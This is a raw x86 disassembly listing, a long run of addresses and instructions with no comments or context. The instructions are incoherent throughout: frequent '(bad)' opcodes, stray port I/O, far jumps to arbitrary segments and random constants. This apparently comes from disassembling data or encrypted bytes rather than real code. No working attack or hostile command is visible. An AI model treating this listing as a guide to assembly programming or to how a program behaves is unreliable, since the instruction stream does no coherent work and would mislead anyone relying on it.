  41297c:	fcomp  DWORD PTR [ecx]
  41297e:	in     al,0x65
  412980:	inc    edx
  412981:	lea    esi,[edi+edi*4-0x75aa6cf4]
  412988:	mov    ecx,0x3f93caf
  41298d:	adc    DWORD PTR [ecx+0x60fc5ba0],0xffffffcb
  412994:	xor    al,BYTE PTR [edx]
  412996:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412997:	sub    eax,0xdee57997
  41299c:	mov    ebp,0x15ff32ee
  4129a1:	push   0x78
  4129a3:	cwde   
  4129a4:	outs   dx,DWORD PTR ds:[esi]
  4129a5:	push   edi
  4129a6:	lock (bad) 
  4129a8:	out    0x17,eax
  4129aa:	clc    
  4129ab:	push   esi
  4129ac:	xchg   ecx,eax
  4129ad:	cmp    esi,DWORD PTR [ebp+0x2e03e01b]
  4129b3:	or     BYTE PTR [ebx+edi*2+0x73],bh
  4129b7:	mov    es,WORD PTR [ebx]
  4129b9:	add    eax,0x83381301
  4129be:	cmp    BYTE PTR [eax+0x6910c5af],al
  4129c4:	(bad)  [eax-0x3f]
  4129c7:	rol    DWORD PTR [ecx],0x96
  4129ca:	jp     0x412a0f
  4129cc:	(bad)  
  4129cd:	js     0x412a16
  4129cf:	lea    eax,[eax-0x540f28f8]
  4129d5:	cmp    eax,0x66660986
  4129da:	dec    ebx
  4129db:	sub    eax,0x5c8a9d35
  4129e0:	pusha  
  4129e1:	ja     0x412a28
  4129e3:	cwde   
  4129e4:	and    BYTE PTR [eax+ebp*4-0x61],bl
  4129e8:	pop    ebp
  4129e9:	sti    
  4129ea:	stc    
  4129eb:	lods   al,BYTE PTR ds:[esi]
  4129ec:	fs arpl dx,si
  4129ef:	jbe    0x4129aa
  4129f1:	inc    ebx
  4129f2:	lods   eax,DWORD PTR ds:[esi]
  4129f3:	push   ebp
  4129f4:	pop    ebp
  4129f5:	jno    0x412a47
  4129f7:	stos   BYTE PTR es:[edi],al
  4129f8:	jbe    0x4129d7
  4129fa:	pop    ecx
  4129fb:	in     eax,0x2b
  4129fd:	into   
  4129fe:	sbb    bl,BYTE PTR [eax-0x6055c2fc]
  412a04:	mov    eax,ds:0x707df70d
  412a09:	sub    al,0x33
  412a0b:	test   al,0x5c
  412a0d:	adc    bl,BYTE PTR cs:[edx+eax*2-0x5fdcf405]
  412a15:	je     0x412a58
  412a17:	ficomp WORD PTR [esi+0x5e]
  412a1a:	jnp    0x412a94
  412a1c:	out    0xca,al
  412a1e:	pop    ds
  412a1f:	daa    
  412a20:	mov    bl,0x6d
  412a22:	cmp    al,0x9d
  412a24:	sbb    dh,bh
  412a26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a27:	out    dx,al
  412a28:	out    dx,al
  412a29:	add    al,0x41
  412a2b:	out    0x17,al
  412a2d:	pop    edi
  412a2e:	sbb    edi,DWORD PTR [esi+0x298ed1b3]
  412a34:	les    ebx,FWORD PTR ds:0x6af9fc67
  412a3a:	or     eax,ebx
  412a3c:	push   es
  412a3d:	adc    esp,edi
  412a3f:	rcl    DWORD PTR [edx-0x1d],cl
  412a42:	repz push 0x831642ba
  412a48:	xchg   BYTE PTR [ebx-0x1a],cl
  412a4b:	mov    edx,0x31757991
  412a50:	(bad)  
  412a51:	shr    BYTE PTR [edi],cl
  412a53:	mov    esi,0x225ee695
  412a58:	in     eax,0xc4
  412a5a:	xchg   esp,eax
  412a5b:	dec    edx
  412a5c:	push   eax
  412a5d:	(bad)  
  412a5e:	mov    WORD PTR [eax+0x2e5fceff],?
  412a64:	mov    esi,0x18f5b983
  412a69:	or     al,0x4c
  412a6b:	adc    al,0xc6
  412a6d:	adc    al,0xdf
  412a6f:	lds    edx,FWORD PTR [ebp-0x3c]
  412a72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a73:	out    dx,al
  412a74:	int3   
  412a75:	xor    eax,DWORD PTR [ebp+edx*8+0x27]
  412a79:	movq   mm7,QWORD PTR [edi]
  412a7c:	mov    esp,DWORD PTR [ebp+0x41]
  412a7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a80:	inc    eax
  412a81:	adc    BYTE PTR [ebp+0x36],ah
  412a84:	pop    ebx
  412a85:	call   0xedeaa2b0
  412a8a:	mov    al,ds:0xea6fffd2
  412a8f:	mov    dl,0xd1
  412a91:	ins    BYTE PTR es:[edi],dx
  412a92:	dec    edi
  412a93:	fcmovne st,st(5)
  412a95:	hlt    
  412a96:	test   BYTE PTR [ecx-0x24],dh
  412a99:	out    0xc4,eax
  412a9b:	push   es
  412a9c:	lods   al,BYTE PTR ds:[esi]
  412a9d:	pop    esp
  412a9e:	push   ds
  412a9f:	fsubrp st(6),st
  412aa1:	repz push 0x0
  412aa4:	xor    DWORD PTR [ecx+0x77],0x15e4b1fb
  412aab:	ins    DWORD PTR es:[edi],dx
  412aac:	aad    0xeb
  412aae:	xor    eax,0xc3388bac
  412ab3:	pop    esi
  412ab4:	cmp    al,0x62
  412ab6:	jecxz  0x412a66
  412ab8:	push   ecx
  412ab9:	push   cs
  412aba:	stos   DWORD PTR es:[edi],eax
  412abb:	jmp    0x618d:0x286f1ffc
  412ac2:	sbb    esp,ecx
  412ac4:	or     DWORD PTR [esi],0x54c8e870
  412aca:	loopne 0x412a61
  412acc:	lahf   
  412acd:	ret    0x24f9
  412ad0:	sbb    ch,BYTE PTR [edx]
  412ad2:	fucomip st,st(4)
  412ad4:	aas    
  412ad5:	(bad)  
  412ad6:	mov    eax,0x9e457eda
  412adb:	add    DWORD PTR ds:0xf700610d,esi
  412ae1:	add    eax,0x2da0cff8
  412ae6:	ffreep st(7)
  412ae8:	sub    bl,BYTE PTR [edx-0x5e]
  412aeb:	clc    
  412aec:	add    eax,0x8031fc7d
  412af1:	or     bh,BYTE PTR [edx+0x26]
  412af4:	pop    ecx
  412af5:	xchg   esi,eax
  412af6:	adc    eax,0xa9e83825
  412afb:	sub    esp,DWORD PTR [edi+0x7]
  412afe:	mov    cl,0xbe
  412b00:	and    al,0xf2
  412b02:	dec    esp
  412b03:	das    
  412b04:	or     cl,bh
  412b06:	js     0x412b48
  412b08:	mov    esi,DWORD PTR es:[esi+0x47]
  412b0c:	mov    bh,0x55
  412b0e:	lods   eax,DWORD PTR ds:[esi]
  412b0f:	xor    eax,0xaeba481
  412b14:	shl    DWORD PTR [esi-0x2a],cl
  412b17:	(bad)  
  412b18:	sbb    bh,BYTE PTR [eax+ebp*2-0x1884f13f]
  412b1f:	div    DWORD PTR [eax+0x13]
  412b22:	adc    bl,BYTE PTR [ebx+0x6a]
  412b25:	sbb    ebp,esi
  412b27:	pop    ebx
  412b28:	mov    ah,0xd6
  412b2a:	push   0xb875be1c
  412b2f:	js     0x412ac6
  412b31:	dec    ebp
  412b32:	fild   DWORD PTR [ebx+0x60]
  412b35:	ror    ch,1
  412b37:	cmp    eax,0xf51f8e5f
  412b3c:	aaa    
  412b3d:	jmp    0x412ba9
  412b3f:	adc    eax,0xba13867e
  412b44:	cs out 0xb2,al
  412b47:	(bad)  
  412b48:	repz jge 0x412b9a
  412b4b:	push   esp
  412b4c:	call   0xf313:0x353217b5
  412b53:	jmp    0x49da:0x5d9ce50a
  412b5a:	dec    DWORD PTR [eax-0x7d]
  412b5d:	mov    dh,0x4e
  412b5f:	ss jmp 0x4cf3:0x8f206235
  412b67:	mov    edx,0x19202f4a
  412b6c:	div    bh
  412b6e:	mov    eax,0xe99b898f
  412b73:	call   0x9906:0x82181312
  412b7a:	cdq    
  412b7b:	in     al,dx
  412b7c:	dec    ebp
  412b7d:	repnz push cs
  412b7f:	popa   
  412b80:	pushf  
  412b81:	and    eax,0x89f77d28
  412b86:	cmp    cl,BYTE PTR [edx-0x4e690633]
  412b8c:	dec    edi
  412b8d:	test   BYTE PTR [ecx-0x5eb6d6af],0xeb
  412b94:	shr    BYTE PTR [esi],cl
  412b96:	enter  0x32b4,0xe
  412b9a:	pop    eax
  412b9b:	data16 cmp al,0x78
  412b9e:	nop
  412b9f:	and    ebx,DWORD PTR [eax+edx*2+0x3f]
  412ba3:	lock inc ebx
  412ba5:	rol    al,cl
  412ba7:	loop   0x412b2b
  412ba9:	clc    
  412baa:	dec    eax
  412bab:	retf   
  412bac:	adc    eax,0x9a6d2b51
  412bb1:	inc    esi
  412bb2:	les    esp,FWORD PTR [ebp+eiz*2+0x1a]
  412bb6:	hlt    
  412bb7:	push   0x2d5af58d
  412bbc:	mov    edi,0xb27bfff
  412bc1:	mov    DWORD PTR [esi+0x29eef3b6],edx
  412bc7:	xor    bh,bl
  412bc9:	jo     0x412bef
  412bcb:	fidivr DWORD PTR [edx+0x1760436f]
  412bd1:	jae    0x412b64
  412bd3:	inc    esp
  412bd4:	inc    eax
  412bd5:	sub    edx,eax
  412bd7:	push   0x3b
  412bd9:	js     0x412c57
  412bdb:	daa    
  412bdc:	push   ecx
  412bdd:	mov    ch,0xf3
  412bdf:	dec    edx
  412be0:	ror    esi,cl
  412be2:	jo     0x412bb9
  412be4:	push   eax
  412be5:	adc    DWORD PTR [ecx+0x44],edx
  412be8:	retf   0xa6a2
  412beb:	push   0x8ffaea6
  412bf0:	dec    edi
  412bf1:	lock jae 0x412c06
  412bf4:	lock jmp 0x299b7dc6
  412bfa:	sub    al,0x7a
  412bfc:	pop    esp
  412bfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bfe:	(bad)  
  412bff:	jl     0x412c17
  412c01:	nop
  412c02:	pop    eax
  412c03:	ret    
  412c04:	xlat   BYTE PTR ds:[ebx]
  412c05:	sbb    bl,BYTE PTR [eax+0x58]
  412c08:	add    esp,edi
  412c0a:	sub    eax,0x4a0cc874
  412c0f:	sbb    ebp,DWORD PTR [ebp-0xa]
  412c12:	lock xor al,BYTE PTR [ebx]
  412c15:	inc    ebp
  412c16:	jl     0x412c8d
  412c18:	jbe    0x412c58
  412c1a:	xchg   esp,eax
  412c1b:	stos   BYTE PTR es:[edi],al
  412c1c:	imul   BYTE PTR [edi-0x76083de5]
  412c22:	push   edi
  412c23:	(bad)  
  412c24:	mov    ch,0xd3
  412c26:	lds    ecx,FWORD PTR [edi]
  412c28:	outs   dx,BYTE PTR ds:[esi]
  412c29:	loop   0x412c8f
  412c2b:	adc    dl,BYTE PTR [esi]
  412c2d:	pop    ebp
  412c2e:	scas   al,BYTE PTR es:[edi]
  412c2f:	push   ecx
  412c30:	add    ebp,DWORD PTR [edx-0x34]
  412c33:	fdiv   DWORD PTR [ecx-0x48bc5d91]
  412c39:	mov    ds:0xe62efa3a,al
  412c3e:	imul   esi,DWORD PTR [edx+0x5e],0x1d35679d
  412c45:	pushf  
  412c46:	xor    edi,DWORD PTR [eax+0x1e]
  412c49:	out    dx,al
  412c4a:	jo     0x412bea
  412c4c:	add    BYTE PTR ds:0xd7f6c5eb,ah
  412c52:	out    0x21,eax
  412c54:	mov    dh,0x44
  412c56:	retf   0xe059
  412c59:	xchg   ecx,eax
  412c5a:	add    DWORD PTR [esi+0x27e15435],0x1e767294
  412c64:	test   al,0x1e
  412c66:	cli    
  412c67:	(bad)  
  412c68:	lock cli 
  412c6a:	aad    0x7d
  412c6c:	test   dl,0xee
  412c6f:	xchg   edx,eax
  412c70:	add    DWORD PTR [ebx-0x4c5c52d6],ecx
  412c76:	xor    BYTE PTR [esi-0x6a16458b],dl
  412c7c:	xchg   ebp,edx
  412c7e:	fdivr  DWORD PTR [edi+0x24]
  412c81:	inc    eax
  412c82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c83:	call   0x4bd0:0xbeb1d244
  412c8a:	inc    edi
  412c8b:	setge  BYTE PTR [ebx]
  412c8e:	inc    BYTE PTR [ebx+edi*8+0x67815f6d]
  412c95:	and    BYTE PTR [ecx-0x5bd7390e],0x2f
  412c9c:	add    DWORD PTR [edx-0x71],esp
  412c9f:	popa   
  412ca0:	jmp    0x412c63
  412ca2:	fld    DWORD PTR [ecx-0x6a]
  412ca5:	mov    edx,DWORD PTR [eax+0x12]
  412ca8:	lods   al,BYTE PTR ds:[esi]
  412ca9:	jle    0x412cb3
  412cab:	cdq    
  412cac:	test   BYTE PTR ds:[ecx+0x51d23285],bl
  412cb3:	push   ecx
  412cb4:	mov    ebx,0x27caf583
  412cb9:	out    dx,al
  412cba:	mov    bh,0x46
  412cbc:	push   0x34
  412cbe:	(bad)  
  412cbf:	adc    al,bh
  412cc1:	jo     0x412c55
  412cc3:	xor    cl,cl
  412cc5:	lock mov esi,0x597ed852
  412ccb:	aas    
  412ccc:	jecxz  0x412c9b
  412cce:	add    ch,cl
  412cd0:	test   eax,0xe32258b0
  412cd5:	and    BYTE PTR [eax-0xc377dd0],bl
  412cdb:	retf   
  412cdc:	fmul   st,st(6)
  412cde:	push   eax
  412cdf:	vandnpd ymm0,ymm4,YMMWORD PTR [ebx-0x2a]
  412ce4:	lahf   
  412ce5:	cld    
  412ce6:	(bad)  
  412ce7:	push   esp
  412ce8:	and    al,0x26
  412cea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ceb:	ret    
  412cec:	inc    edi
  412ced:	add    BYTE PTR ds:0xd8b20fa2,al
  412cf3:	mov    DWORD PTR [eax-0x5e],0xafe8acce
  412cfa:	cdq    
  412cfb:	mov    bh,0xb9
  412cfd:	test   BYTE PTR [esi-0x41],dh
  412d00:	or     edi,DWORD PTR [edx]
  412d02:	test   eax,0x8c0061be
  412d07:	mov    ebx,0x3c93066b
  412d0c:	stc    
  412d0d:	mov    DWORD PTR [eax+0x6c],eax
  412d10:	dec    edi
  412d11:	ds sbb eax,0xad0e9e16
  412d17:	jmp    0x412d93
  412d19:	xlat   BYTE PTR ds:[ebx]
  412d1a:	mov    ebx,0x1dd5ef5f
  412d1f:	dec    eax
  412d20:	add    al,0xcd
  412d22:	jmp    0xf13:0x1cf1721
  412d29:	retf   
  412d2a:	jecxz  0x412ce7
  412d2c:	pop    es
  412d2d:	add    BYTE PTR [esi],dh
  412d2f:	mov    ebx,0x64fac9b6
  412d34:	ds fwait
  412d36:	add    DWORD PTR [ebx],ebp
  412d38:	sbb    dl,BYTE PTR [edx]
  412d3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d3b:	inc    edi
  412d3c:	xchg   ebx,eax
  412d3d:	sub    ebp,DWORD PTR [eax]
  412d3f:	rcr    bl,0xdc
  412d42:	or     ecx,DWORD PTR [esi]
  412d44:	fnsave [edx+0x6b]
  412d47:	pop    ebx
  412d48:	pop    esp
  412d49:	imul   edx,esi,0x32
  412d4c:	cmp    BYTE PTR [ecx],dl
  412d4e:	push   esi
  412d4f:	push   esi
  412d50:	(bad)  
  412d51:	aaa    
  412d52:	push   ebx
  412d53:	mov    dl,0x55
  412d55:	add    esp,DWORD PTR [ecx-0x4536c53e]
  412d5b:	pop    eax
  412d5c:	xor    ah,al
  412d5e:	cwde   
  412d5f:	dec    edi
  412d60:	and    ebp,DWORD PTR [edx+0x574236ff]
  412d66:	xchg   BYTE PTR [ebp-0x45],bl
  412d69:	or     ecx,DWORD PTR [eax*8-0x78f4183d]
  412d70:	mov    eax,0x1093b4c2
  412d75:	fcomp  QWORD PTR [esp+esi*1+0x70]
  412d79:	inc    esi
  412d7a:	inc    esp
  412d7b:	std    
  412d7c:	cmp    dh,BYTE PTR [edi]
  412d7e:	aaa    
  412d7f:	add    BYTE PTR [ebx-0x7b],al
  412d82:	sub    dl,BYTE PTR [esi-0xf65f50f]
  412d88:	or     al,0x74
  412d8a:	or     DWORD PTR [esi],eax
  412d8c:	fist   DWORD PTR [edi-0x1c1abdc3]
  412d92:	popf   
  412d93:	sub    DWORD PTR [edi-0xb0e754d],edi
  412d99:	shl    DWORD PTR gs:[eax+0x55],cl
  412d9d:	pop    ecx
  412d9e:	in     al,dx
  412d9f:	adc    eax,0x2ff703af
  412da4:	adc    eax,0xb628773e
  412da9:	outs   dx,BYTE PTR ds:[esi]
  412daa:	mov    esp,0x8dcf9874
  412daf:	and    al,0xf8
  412db1:	sub    edx,DWORD PTR [edx]
  412db3:	sub    DWORD PTR [ecx],edx
  412db5:	sub    eax,0xd0cccf0c
  412dba:	mov    eax,ds:0x3f4866dd
  412dbf:	push   ecx
  412dc1:	mov    bh,0x90
  412dc3:	mov    cl,0x2e
  412dc5:	push   0xffffff9b
  412dc7:	mov    dl,BYTE PTR [ecx]
  412dc9:	sub    bh,0x9b
  412dcc:	pop    esp
  412dcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412dce:	outs   dx,DWORD PTR ds:[esi]
  412dcf:	retf   
  412dd0:	cld    
  412dd1:	pop    ebx
  412dd2:	mov    al,0xd2
  412dd4:	fistp  WORD PTR [ebx+0x26e39c7b]
  412dda:	cld    
  412ddb:	int3   
  412ddc:	addr16 retf 
  412dde:	push   0xffffff88
  412de0:	pop    ds
  412de1:	stc    
  412de2:	mov    ds:0xe2636280,al
  412de7:	mov    edi,0x3e6e9533
  412dec:	add    edi,DWORD PTR [eax]
  412dee:	xchg   edi,eax
  412def:	call   0x682e:0xfe3b39cb
  412df6:	test   BYTE PTR [edi-0x5a],bl
  412df9:	test   al,0x1a
  412dfb:	pop    ds
  412dfc:	xchg   DWORD PTR [edx-0x14],ebp
  412dff:	push   0xb7734aaa
  412e04:	retf   0xf6ad
  412e07:	mov    ch,0x94
  412e09:	lahf   
  412e0a:	(bad)  
  412e0b:	fdivr  DWORD PTR [ebx+0x66]
  412e0e:	scas   eax,DWORD PTR es:[edi]
  412e0f:	test   eax,0x3610f72b
  412e14:	fwait
  412e15:	cmp    DWORD PTR [eax+0x5981e532],edi
  412e1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e1c:	pop    esp
  412e1d:	leave  
  412e1e:	rol    DWORD PTR [ecx-0x14],0x21
  412e22:	into   
  412e23:	adc    DWORD PTR [edx-0x54],edi
  412e26:	imul   DWORD PTR [eax]
  412e28:	sahf   
  412e29:	xchg   ebp,eax
  412e2a:	pusha  
  412e2b:	push   ebp
  412e2c:	sbb    al,0x82
  412e2e:	xlat   BYTE PTR ds:[ebx]
  412e2f:	dec    ebx
  412e30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e31:	mov    eax,ds:0x6551cd09
  412e36:	xchg   ebp,eax
  412e37:	test   al,0x1b
  412e39:	xchg   edx,eax
  412e3a:	mov    edx,0x677cd953
  412e3f:	pop    esi
  412e40:	push   eax
  412e41:	mov    ch,BYTE PTR [ebx+0x7a55f93a]
  412e47:	dec    esp
  412e48:	xor    eax,0x24f5a83b
  412e4d:	or     al,0xc8
  412e4f:	test   BYTE PTR [ebx-0x21],0xc1
  412e53:	cld    
  412e54:	fistp  WORD PTR [edi-0x32546fb4]
  412e5a:	or     bl,ah
  412e5c:	push   ebx
  412e5d:	cwde   
  412e5e:	jb     0x412e31
  412e60:	outs   dx,DWORD PTR ds:[esi]
  412e61:	and    BYTE PTR [ebx+0x293d9829],0xfd
  412e68:	out    dx,eax
  412e69:	xchg   DWORD PTR [ecx+0x687a3a10],ebp
  412e6f:	dec    ebx
  412e70:	scas   al,BYTE PTR es:[edi]
  412e71:	ret    
  412e72:	mov    bl,0x34
  412e74:	je     0x412ece
  412e76:	retf   0xdf16
  412e79:	xor    dh,BYTE PTR [ebp-0x1774eee3]
  412e7f:	jmp    0x412ed1
  412e81:	icebp  
  412e82:	cmp    eax,0xe01c15fa
  412e87:	adc    ebx,esp
  412e89:	pop    esi
  412e8a:	ja     0x412e2b
  412e8c:	mov    dh,0x7d
  412e8e:	cwde   
  412e8f:	dec    ebx
  412e90:	popf   
  412e91:	das    
  412e92:	add    DWORD PTR [edx-0x1],edx
  412e95:	call   0x92b7d7f9
  412e9a:	outs   dx,DWORD PTR ds:[esi]
  412e9b:	std    
  412e9c:	adc    al,0x82
  412e9e:	add    al,0x9c
  412ea0:	in     al,dx
  412ea1:	add    al,0x4b
  412ea3:	mov    ah,0x38
  412ea5:	sub    al,0x54
  412ea7:	mov    BYTE PTR [edx-0x38c722c9],bh
  412ead:	sub    DWORD PTR [ebx],ebp
  412eaf:	into   
  412eb0:	movsx  ebx,BYTE PTR [ebx+eiz*4-0x3803bd75]
  412eb8:	mov    cl,ah
  412eba:	sub    BYTE PTR [ecx+edx*8+0x6d],0xc4
  412ebf:	cli    
  412ec0:	repz add DWORD PTR [eax+0x35eed45e],esi
  412ec7:	lds    esp,FWORD PTR [ebx]
  412ec9:	or     eax,0x3e6420ae
  412ece:	fbld   TBYTE PTR [eax-0x2f]
  412ed1:	cmp    ch,BYTE PTR [eax]
  412ed3:	xchg   esi,eax
  412ed4:	push   0xe3d84ee3
  412ed9:	inc    edx
  412eda:	xchg   esp,eax
  412edb:	and    edx,DWORD PTR [ebp-0x4db98d56]
  412ee1:	nop
  412ee2:	or     eax,0x9c83ebb3
  412ee7:	xor    ebx,DWORD PTR [eax]
  412ee9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412eea:	cli    
  412eeb:	dec    ebx
  412eec:	das    
  412eed:	adc    esi,DWORD PTR [ebx]
  412eef:	out    0x6a,eax
  412ef1:	add    DWORD PTR [ecx+0x67],esi
  412ef4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ef5:	das    
  412ef6:	mov    WORD PTR [eax],?
  412ef8:	in     eax,0xf7
  412efa:	mov    al,ds:0x2f1a2bdc
  412eff:	fwait
  412f00:	jmp    0x846f:0x946f19f3
  412f07:	pop    es
  412f08:	loopne 0x412f81
  412f0a:	je     0x412ef5
  412f0c:	mov    edx,0x82838a53
  412f12:	(bad)  
  412f14:	fnstenv [esi+0x4a]
  412f17:	adc    al,cl
  412f19:	sbb    DWORD PTR [edx-0x6370618c],0x8059197e
  412f23:	sahf   
  412f24:	push   ebp
  412f25:	xchg   ecx,eax
  412f26:	pop    edx
  412f27:	fst    QWORD PTR [ebp-0x70f56a41]
  412f2d:	shl    DWORD PTR [bp-0x62c4],cl
  412f32:	fmul   QWORD PTR [ebx]
  412f34:	js     0x412f89
  412f36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f37:	jecxz  0x412ecd
  412f39:	inc    edi
  412f3a:	xchg   esp,eax
  412f3b:	sub    eax,DWORD PTR [esi-0x39664808]
  412f41:	popf   
  412f42:	jb     0x412fa9
  412f44:	cmp    edi,DWORD PTR ds:0x4a0df66b
  412f4a:	mov    esp,edi
  412f4c:	mov    al,ds:0x2c6e6fe5
  412f51:	ror    BYTE PTR [ecx+0x4394e314],cl
  412f57:	mov    cl,0xbb
  412f59:	fist   WORD PTR [edi-0x9]
  412f5c:	or     DWORD PTR [edi+0x985e2a4],ecx
  412f62:	mov    BYTE PTR [esi-0x50],cl
  412f65:	clc    
  412f66:	mov    ds:0xb3d042c4,eax
  412f6b:	sub    BYTE PTR [esi-0x40],dl
  412f6e:	into   
  412f6f:	add    eax,0x542a842c
  412f74:	dec    esp
  412f75:	inc    esp
  412f76:	pop    ss
  412f77:	fstp   DWORD PTR [esi]
  412f79:	push   edi
  412f7a:	dec    esp
  412f7b:	push   ss
  412f7c:	push   es
  412f7d:	shr    BYTE PTR [esi+0xd209b51],0xbd
  412f84:	ffreep st(6)
  412f86:	aas    
  412f87:	dec    ebx
  412f88:	xchg   edx,eax
  412f89:	sub    BYTE PTR [esi+edx*8],0x16
  412f8d:	(bad)  
  412f8e:	stc    
  412f8f:	ss inc edi
  412f91:	(bad)  [eax-0x5d]
  412f94:	and    eax,DWORD PTR [esi+edi*2-0x78adf376]
  412f9b:	sbb    eax,0xffffffcf
  412f9e:	inc    edx
  412f9f:	xchg   edi,eax
  412fa0:	sub    edi,esp
  412fa2:	xchg   ebx,eax
  412fa3:	sub    ah,bh
  412fa5:	mov    cl,BYTE PTR [ebx+0x3e887b25]
  412fab:	into   
  412fac:	xchg   ebx,eax
  412fad:	lea    edi,[ecx+edi*2-0x1ce351b8]
  412fb4:	jle    0x412f52
  412fb6:	jmp    0x412f80
  412fb8:	sbb    DWORD PTR [eax],edx
  412fba:	xor    ecx,DWORD PTR [ecx+0x6f]
  412fbd:	jmp    0x41c3:0xa6f7e603
  412fc4:	iret   
  412fc5:	stos   BYTE PTR es:[edi],al
  412fc6:	dec    eax
  412fc7:	repz in eax,dx
  412fc9:	ret    
  412fca:	xor    al,0x14
  412fcc:	mov    ebx,0x33eb0ff5
  412fd1:	mov    ecx,0xe923b4cc
  412fd6:	or     edi,DWORD PTR [esi]
  412fd8:	(bad)  
  412fd9:	adc    DWORD PTR [eax+0x1e587a3a],ecx
  412fdf:	pop    ss
  412fe0:	sub    dh,ch
  412fe2:	jbe    0x412ff1
  412fe4:	icebp  
  412fe5:	sbb    al,0x49
  412fe7:	rcl    DWORD PTR fs:[edi+edi*8],cl
  412feb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fec:	inc    esi
  412fed:	repz in al,dx
  412fef:	in     al,dx
  412ff0:	dec    ebp
  412ff1:	or     DWORD PTR [ebx+eiz*4],esi
  412ff4:	push   0x52
  412ff6:	arpl   WORD PTR [ecx+0x42f0f537],ax
  412ffc:	into   
  412ffd:	cmp    esp,0xb3d62fa0
  413003:	inc    ecx
  413004:	sbb    ch,bl
  413006:	pop    ss
  413007:	jmp    0x412fd9
  413009:	ins    BYTE PTR es:[edi],dx
  41300a:	mov    al,ds:0xd8ac70eb
  41300f:	stos   BYTE PTR es:[edi],al
  413010:	adc    eax,0x93b0b300
  413015:	ret    0x9007
  413018:	ds push cs
  41301a:	mov    WORD PTR [edx+esi*1+0x3d],cs
  41301e:	and    BYTE PTR [eax+0x4d],cl
  413021:	rcr    BYTE PTR [ecx],0x69
  413024:	push   ebx
  413025:	jbe    0x41306b
  413027:	js     0x413047
  413029:	aad    0xc5
  41302b:	dec    esp
  41302c:	test   BYTE PTR [ebp-0x45cd4ee6],0xdb
  413033:	or     DWORD PTR [ecx+0x45],esp
  413036:	lea    eax,[esp+ecx*8]
  413039:	clc    
  41303a:	bound  edi,QWORD PTR [ebp+0x7b]
  41303d:	jae    0x41304d
  41303f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413040:	fidivr WORD PTR [ecx-0x42]
  413043:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413044:	call   0x9bdc:0xf03a762a
  41304b:	push   ds
  41304c:	or     BYTE PTR [ebx+0x405eb041],bh
  413052:	pminub mm4,QWORD PTR [ebx-0x7c85435b]
  413059:	dec    esi
  41305a:	sahf   
  41305b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41305c:	(bad)  
  41305d:	or     BYTE PTR [ebx-0x4d],ch
  413060:	push   edx
  413061:	test   DWORD PTR [ebp+0x7f59e31c],0x19202e95
  41306b:	inc    esp
  41306c:	mov    ebp,ds
  41306e:	mov    dl,0xe8
  413070:	mov    bh,0xea
  413072:	inc    esp
  413073:	cmp    DWORD PTR [edi-0x26],0xa1eff292
  41307a:	pop    esi
  41307b:	push   ebx
  41307c:	sub    DWORD PTR [eax+0x6a],eax
  41307f:	cmc    
  413080:	adc    eax,0x1e109fa2
  413085:	xchg   ebx,eax
  413086:	shl    BYTE PTR [ebx],cl
  413088:	or     DWORD PTR [eax],ebp
  41308a:	cmp    ch,0xec
  41308d:	jne    0x4130d3
  41308f:	imul   ecx,DWORD PTR [ecx+0x68],0x46
  413093:	and    al,0x22
  413095:	call   FWORD PTR [ebx-0x5b]
  413098:	xor    DWORD PTR [ebx-0x5db865b3],0x25
  41309f:	mov    bl,0xa3
  4130a1:	not    BYTE PTR [ecx+eax*1]
  4130a4:	rcr    DWORD PTR [ebx-0xb111bcb],0xb1
  4130ab:	sub    al,0xb
  4130ad:	dec    edi
  4130ae:	daa    
  4130af:	call   0x41:0x237791d4
  4130b6:	cmp    eax,0x63c2258e
  4130bb:	imul   ebx,DWORD PTR [edi],0x1104749a
  4130c1:	dec    ebx
  4130c2:	out    0xa1,eax
  4130c4:	or     DWORD PTR [esi-0x65],edx
  4130c7:	les    edi,FWORD PTR [ecx-0x1f57b50]
  4130cd:	dec    edi
  4130ce:	mov    eax,0xb8b58766
  4130d3:	xchg   bl,dl
  4130d5:	inc    ecx
  4130d6:	sub    esi,DWORD PTR [eax-0x1175c924]
  4130dc:	and    bh,0x40
  4130df:	inc    esp
  4130e0:	sub    ebx,DWORD PTR [esi-0x71b45d8a]
  4130e6:	repnz pop ebp
  4130e8:	fwait
  4130e9:	idiv   DWORD PTR [eax]
  4130eb:	je     0x4130d9
  4130ed:	fsub   DWORD PTR [edi-0x4e990544]
  4130f3:	or     eax,0x5d4bcf60
  4130f8:	test   al,0x6a
  4130fa:	retf   0xd16d
  4130fd:	lds    ebp,FWORD PTR [edi]
  4130ff:	stos   BYTE PTR es:[edi],al
  413100:	xchg   esp,eax
  413101:	xchg   edx,eax
  413102:	mov    dl,bh
  413104:	in     eax,dx
  413105:	adc    ah,BYTE PTR [esp+edx*4-0x7f]
  413109:	fwait
  41310a:	test   eax,0x4f44d66e
  41310f:	mov    al,0x5d
  413111:	inc    esp
  413112:	cmc    
  413113:	hlt    
  413114:	(bad)  
  413115:	retf   0x4e28
  413118:	arpl   WORD PTR [edx],bx
  41311a:	ins    BYTE PTR es:[edi],dx
  41311b:	dec    edi
  41311c:	mov    bh,0xe7
  41311e:	jl     0x4130a4
  413120:	scas   eax,DWORD PTR es:[edi]
  413121:	xor    al,BYTE PTR [ebx-0x21]
  413124:	dec    eax
  413125:	(bad)  
  413126:	sub    al,0xc
  413128:	xchg   DWORD PTR [ebp+0x5352f241],esp
  41312e:	sub    DWORD PTR [esi],ebx
  413130:	push   ebp
  413131:	adc    DWORD PTR [ebp+0x689a87bc],0xc3309812
